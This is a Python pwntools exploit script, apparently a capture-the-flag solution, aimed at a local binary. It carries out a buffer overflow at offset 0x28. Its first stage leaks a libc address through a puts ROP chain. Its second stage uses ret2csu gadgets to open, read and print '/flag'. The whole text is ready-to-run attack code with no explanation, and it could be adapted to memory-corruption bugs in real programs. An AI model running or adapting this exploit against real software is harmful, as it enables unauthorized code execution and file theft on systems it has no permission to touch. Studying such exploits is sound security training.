from pwn import *

binary_path = 'binary'
libc_path = '/lib/x86_64-linux-gnu/libc.so.6'

context.binary = elf = ELF(binary_path)
libc = ELF(libc_path)

p = process(binary_path)

OFFSET = 0x28
rop = ROP(elf)
POP_RDI = rop.find_gadget(['pop rdi', 'ret'])[0]
RET = rop.find_gadget(['ret'])[0]

CSU_POP = 0x40153a
CSU_CALL = 0x401520

DATA_ADDR = elf.bss() + 0x500

def ret2csu(call_ptr_addr, rdi, rsi, rdx):
    return flat(
        CSU_POP,
        0,          
        1,          
        rdi,        
        rsi,        
        rdx,        
        call_ptr_addr,
        CSU_CALL,
        0, 0, 0, 0, 0, 0, 0
    )


log.info("Stage 1: Leaking libc address...")

payload1 = b'A' * OFFSET
payload1 += p64(RET)
payload1 += p64(POP_RDI)
payload1 += p64(elf.got['puts'])
payload1 += p64(elf.plt['puts'])
payload1 += p64(elf.entry) 

p.recvuntil(b"###\n")
p.sendline(payload1)

p.recvuntil(b"Leaving!\n")
leaked_puts = u64(p.recv(6).ljust(8, b"\x00"))
libc.address = leaked_puts - libc.symbols['puts']

log.success(f"Libc Base: {hex(libc.address)}")



log.info("Stage 2: Executing Open/Read/Write chain...")

FLAG_STR = DATA_ADDR
OPEN_PTR = DATA_ADDR + 0x10
READ_PTR = DATA_ADDR + 0x18
BUF_ADDR = DATA_ADDR + 0x40

payload2 = b'A' * OFFSET
payload2 += p64(RET)
payload2 += ret2csu(elf.got['read'], 0, DATA_ADDR, 0x100)
payload2 += ret2csu(OPEN_PTR, FLAG_STR, 0, 0)
payload2 += ret2csu(READ_PTR, 3, BUF_ADDR, 0x100)
payload2 += p64(POP_RDI)
payload2 += p64(BUF_ADDR)
payload2 += p64(elf.plt['puts'])

p.recvuntil(b"###\n")
p.sendline(payload2)

log.info("Sending BSS data (filename + function pointers)...")
bss_data = b"/flag\x00".ljust(0x10, b"\x00")
bss_data += p64(libc.symbols['open'])
bss_data += p64(libc.symbols['read'])
p.send(bss_data.ljust(0x100, b"\x00"))

p.interactive()
